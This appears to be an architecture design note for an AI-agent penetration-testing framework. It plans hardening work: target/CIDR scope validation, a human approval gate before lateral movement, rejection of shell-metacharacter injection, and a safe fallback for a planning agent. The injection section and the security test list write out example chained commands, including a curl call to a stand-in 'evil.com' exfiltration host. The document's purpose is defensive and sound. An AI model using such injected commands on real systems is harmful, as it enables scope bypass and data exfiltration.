# Phase -1 Architecture — Chimeras v2 Prerequisites

**Author**: Delta
**Date**: 2026-07-21
**Status**: Draft — gates all Phase -1 development

---

## 1. Objective

Close four security and reliability gaps in Chimeras v1 before any v2 autonomy work begins:

1. **Hard target/CIDR validation** — code-level enforcement that tool commands only target hosts within `state["mission"]["scope"]`
2. **Lateral approval gate** — second human-in-loop gate before any lateral/internal pivot
3. **Shell-metacharacter injection fix** — close the `shell=True` command-injection bypass in `ToolExecutor.run()`
4. **WarChief fallback** — defined safe degradation when WarChief LLM output is malformed or the call fails

These are blocking prerequisites for Phase 3 (Lateral Movement) and are required before any v2 graph rewiring that increases WarChief invocation frequency.

---

## 2. Tech Stack

No new dependencies. All changes are within the existing Python 3.11+ codebase:
- `core/scope.py` — target validation, shell-metacharacter detection
- `core/tool_executor.py` — command sanitization, shell=False migration
- `core/state.py` — new state fields
- `graph.py` — lateral approval gate node
- `warchief/agent.py` — fallback logic

---

## 3. Component Breakdown

### 3.1 Target/CIDR Validation (`core/scope.py` — new class `TargetValidator`)

**Responsibility**: Parse a shell command, extract IP/hostname targets, resolve them, and verify they fall within the mission scope.

**Interface**:
```python
class TargetValidator:
    @staticmethod
    def extract_targets(command: str) -> List[str]:
        """Extract IP addresses and hostnames from a command string."""
    
    @staticmethod
    def resolve_target(target: str) -> List[str]:
        """Resolve a hostname to IP addresses. Returns [target] if already an IP."""
    
    @staticmethod
    def is_in_scope(target: str, scope: str) -> bool:
        """Check if an IP or hostname falls within the given scope (CIDR, IP, domain)."""
    
    @staticmethod
    def validate(command: str, scope: str) -> tuple[bool, str]:
        """Full validation: extract targets, resolve, check scope. Returns (allowed, reason)."""
```

**Scope format support**:
- CIDR: `10.10.10.0/24`, `192.168.1.0/24`
- Single IP: `10.10.10.5`
- Domain: `example.com` (wildcard match: `*.example.com`)
- Comma-separated list: `10.10.10.0/24, example.com`
- `any` or `*` — bypass (for development/testing only, logged with warning)

**Integration point**: `BaseBot._run_tool()` in `core/base_bot.py`, after scope category check, before `executor.run()`. Also callable from `ScopeEnforcer` for unified enforcement.

**Edge cases**:
- Commands with no identifiable target (e.g., `ls`, `whoami`) — pass through (no target to validate)
- Hostname resolves to multiple IPs — all must be in scope
- DNS resolution failure — block with clear error (don't silently pass)
- Private IPs in scope — must match exactly (no `10.0.0.0/8` implied)

### 3.2 Lateral Approval Gate (`graph.py` + `core/state.py`)

**Responsibility**: Add a second human-in-loop gate that fires before any lateral/internal pivot, independent of the existing exploitation gate.

**State changes** (`core/state.py`):
```python
class SwarmState(TypedDict, total=False):
    # ... existing fields ...
    lateral_approval: bool          # NEW — lateral movement gate flag
    target_context: str             # NEW — "external" | "lateral"
    external_targets: List[str]     # NEW — external-facing hosts (initial scope)
    internal_targets: List[str]     # NEW — internally-discovered hosts
    exploited_hosts: List[str]      # NEW — hosts with confirmed access
```

**Graph changes** (`graph.py`):
- New node: `lateral_approval_node` — same pattern as `human_approval_node`
- Presents internal targets discovered, asks operator y/n
- `--approve` flag bypasses both gates (existing behavior extended)
- Denied → route to Bookkeeper (not retry loop)
- Approved → route to ARIA for lateral recon

**Gate trigger**: WarChief decision value `pivot_lateral_recon` or any `lateral_*` value. The routing function checks `state["warchief_decision"]` and routes to `lateral_approval` node before ARIA.

**Note**: This gate is wired in Phase -1 but the routing logic that triggers it lands in Phase 1 (graph rewiring). Phase -1 creates the gate infrastructure; Phase 1 wires the conditional edges to it.

### 3.3 Shell-Metacharacter Injection Fix (`core/tool_executor.py` + `core/scope.py`)

**Problem**: `ToolExecutor.run()` passes the LLM-generated command string directly to `subprocess.run(shell=True)`. The scope check in `ScopeEnforcer.check()` only inspects the first token. Shell metacharacters (`;`, `&&`, `|`, backticks, `$()`, newlines) allow command injection that bypasses category enforcement entirely.

Example: `nmap 10.10.10.1; curl http://evil.com/exfil` — scope check sees `nmap` (allowed for Lisa), but `curl` executes anyway.

**Solution — Two-tier approach**:

**Tier 1: Shell metacharacter detection** (`core/scope.py` — new method on `ScopeEnforcer`):
```python
SHELL_METACHARS = {';', '&&', '||', '|', '`', '$(' , '$(', '\n'}

@staticmethod
def has_shell_metachars(command: str) -> bool:
    """Detect shell metacharacters that enable command chaining/injection."""
```

**Tier 2: Category-based enforcement** (`core/tool_executor.py`):
- Categories that REQUIRE shell (`exploitation`, `privesc`, `exfiltration` — they include `bash`, `python3`): allow metacharacters, but log a warning
- All other categories (`passive_recon`, `active_scan`, `vuln_detection`, `payload_fab`): REJECT commands containing shell metacharacters
- `none` category: no tool execution at all (unchanged)

**Tier 3: `shell=False` migration** (future, not Phase -1):
- For categories that don't need shell features, use `shlex.split()` + `subprocess.run(args, shell=False)`
- This is noted in architecture but deferred — the metacharacter rejection is the immediate fix

**Integration**: `BaseBot._run_tool()` calls `ScopeEnforcer.check_shell_safety(command, bot_name)` before `executor.run()`. If rejected, returns a blocked result (same pattern as scope violation).

### 3.4 WarChief Fallback (`warchief/agent.py`)

**Problem**: v1 WarChief runs once. A bad JSON parse kills one planning step. v2 WarChief runs at 5-6 decision points — it becomes a single point of failure for the entire engagement.

**Solution**: Override `run()` in `WarChief` to add a fallback layer:

```python
async def run(self) -> Dict[str, Any]:
    try:
        result = await super().run()
    except Exception as e:
        # Fallback: safe conservative route
        fallback_decision = {
            "needed": True,
            "strategy": "fallback",
            "confidence": 0.0,
            "reasoning": f"WarChief LLM call failed: {e}. Defaulting to safe report route.",
            "commands": [],
            "next_bot": "bookkeeper",
            "mission_phase": "report",
            "decision": "report",
            "plan_content": "## WarChief Fallback\n\nLLM call failed. Engagement terminated safely. See log for details."
        }
        # Write fallback to plan.md
        self._write_fallback_plan(fallback_decision, str(e))
        # Update state
        self.state["warchief_decision"] = "report"
        self.state["warchief_fallback"] = True
        self.state.setdefault("reasoning_reports", {})[self.bot_name] = fallback_decision
        return {"reasoning": fallback_decision, "executed": False, "fallback": True}
```

**Also handle**: malformed but parseable JSON (missing `decision` field, invalid `decision` value). Add validation after `_parse_json_response()`:
```python
VALID_DECISIONS = {"recon", "scan", "vulns_found_exploit", "insufficient_data_abort",
                   "lateral_recon", "lateral_scan", "pivot_lateral_recon",
                   "exploit", "privesc", "exfil", "report", "cleanup"}

if decision.get("decision") not in VALID_DECISIONS:
    # Fallback to report
```

**Fallback routing**: When `state["warchief_fallback"]` is True, the graph routing function (Phase 1) routes directly to Bookkeeper. In Phase -1 (linear graph), the fallback writes the plan and the graph proceeds linearly — but the `next_bot` field is set to `bookkeeper` for when Phase 1 conditional routing reads it.

---

## 4. API Contracts

No new external APIs. Internal contracts:

### 4.1 TargetValidator.validate()
```
Input:  command: str, scope: str
Output: (allowed: bool, reason: str)
Errors: DNS resolution failure → (False, "DNS resolution failed for <hostname>")
        Out of scope → (False, "Target <ip> not in scope <scope>")
        No targets found → (True, "No identifiable targets in command")
```

### 4.2 ScopeEnforcer.check_shell_safety()
```
Input:  command: str, bot_name: str
Output: (safe: bool, reason: str)
Errors: Metacharacters in restricted category → (False, "Shell metacharacters not allowed in <category>")
        Clean command → (True, "OK")
```

### 4.3 lateral_approval_node()
```
Input:  state: SwarmState
Output: state with lateral_approval: bool set
Side effects: prints to stdout, reads stdin (or uses auto_approve flag)
```

---

## 5. Data Model

### 5.1 New SwarmState fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `lateral_approval` | `bool` | `False` | Lateral movement gate flag |
| `target_context` | `str` | `"external"` | Current target context: `external` or `lateral` |
| `external_targets` | `List[str]` | `[]` | External-facing hosts from initial scope |
| `internal_targets` | `List[str]` | `[]` | Internally-discovered hosts |
| `exploited_hosts` | `List[str]` | `[]` | Hosts with confirmed access |
| `warchief_decision` | `str` | `""` | WarChief's last routing decision |
| `warchief_fallback` | `bool` | `False` | Whether WarChief is in fallback mode |

### 5.2 Scope format in mission state

`state["mission"]["scope"]` is a string. Format examples:
- `"10.10.10.0/24"`
- `"10.10.10.5, 192.168.1.0/24, example.com"`
- `"*.example.com"`

The `TargetValidator` parses this into individual scope entries and matches against resolved IPs.

---

## 6. Security Threat Model

| Threat | OWASP/MITRE | Mitigation |
|--------|-------------|------------|
| Command injection via shell metacharacters | OWASP A03:2021 Injection, MITRE T1059.004 | `ScopeEnforcer.check_shell_safety()` rejects metacharacters in restricted categories |
| Out-of-scope target exploitation | MITRE T1588.006 (no direct OWASP mapping) | `TargetValidator.validate()` blocks commands targeting hosts outside scope |
| Lateral movement without authorization | MITRE T1021 (no direct OWASP mapping) | `lateral_approval` gate requires human sign-off before any internal pivot |
| WarChief SPOF causing engagement crash | MITRE ATLAS AML.T0014 (no direct OWASP mapping) | Fallback defaults to safe `report` route; engagement degrades, doesn't crash |
| DNS rebinding to bypass scope | OWASP A01:2021 | `TargetValidator` resolves hostnames at validation time and checks resolved IPs |
| LLM prompt injection to bypass scope | MITRE ATLAS AML.T0051 | Code-level checks, not prompt instructions — LLM cannot override `TargetValidator` |

---

## 7. Dependencies

No new external dependencies. All changes use stdlib:
- `ipaddress` — CIDR matching (Python 3.3+)
- `socket` — DNS resolution
- `re` — IP/hostname extraction, metacharacter detection
- `shlex` — command parsing (already used)

No CVEs to flag. All stdlib.

---

## 8. Open Questions

1. **Scope format**: Should `state["mission"]["scope"]` remain a free-form string, or should we parse it into a structured list at mission setup time? Decision: keep as string for now, parse in `TargetValidator`. Structured parsing can be added in Phase 0 (config migration).

2. **DNS resolution timeout**: How long should `TargetValidator.resolve_target()` wait before timing out? Decision: 5 seconds. DNS failures block the command — better to block than to silently pass.

3. **`shell=False` migration**: Should we do this in Phase -1 or defer? Decision: DEFER. The metacharacter rejection is the immediate fix. `shell=False` migration touches every tool invocation and needs per-tool testing. Track as Phase -1.5 or Phase 0 follow-up.

4. **Lateral gate wiring**: The gate node is built in Phase -1 but the conditional edge that routes to it lands in Phase 1. Is this acceptable? Decision: Yes. Phase -1 builds the infrastructure. Phase 1 wires it. The gate is inert until Phase 1 conditional edges exist.

---

## 9. Files Changed

| File | Change Type | Description |
|------|-------------|-------------|
| `core/scope.py` | MODIFY | Add `TargetValidator` class, `check_shell_safety()`, `SHELL_METACHARS` |
| `core/tool_executor.py` | MODIFY | Add metacharacter rejection in `run()`, or integrate via `BaseBot._run_tool()` |
| `core/state.py` | MODIFY | Add 7 new fields to `SwarmState` |
| `core/base_bot.py` | MODIFY | Integrate `TargetValidator.validate()` and `check_shell_safety()` into `_run_tool()` |
| `graph.py` | MODIFY | Add `lateral_approval_node`, register in graph |
| `warchief/agent.py` | MODIFY | Override `run()` with fallback, add decision validation |
| `main.py` | MODIFY | Initialize new state fields with defaults |

---

## 10. Testing Strategy

### Unit Tests (Qwen)
- `test_target_validator.py`: CIDR matching, IP extraction, hostname resolution, out-of-scope rejection, edge cases
- `test_shell_safety.py`: Metacharacter detection, category-based allow/deny, edge cases
- `test_warchief_fallback.py`: Malformed JSON, missing decision field, invalid decision value, LLM call failure simulation
- `test_lateral_gate.py`: Gate node state transitions, approve/deny paths

### Security Tests (Scar)
- Attempt scope bypass via `; curl evil.com` in nmap command
- Attempt scope bypass via `&&` chaining
- Attempt scope bypass via backtick substitution
- Attempt scope bypass via `$()` command substitution
- Attempt to target out-of-scope IP in exploitation command
- Verify WarChief fallback doesn't crash the graph
- Verify lateral gate blocks without approval

---

## 11. Implementation Order

1. `core/state.py` — new fields (no dependencies)
2. `core/scope.py` — `TargetValidator` + `check_shell_safety()` (depends on state for scope access)
3. `core/tool_executor.py` — metacharacter rejection (depends on scope.py)
4. `core/base_bot.py` — integrate validators into `_run_tool()` (depends on 2, 3)
5. `warchief/agent.py` — fallback (depends on state.py)
6. `graph.py` — lateral approval gate (depends on state.py)
7. `main.py` — state initialization (depends on state.py)
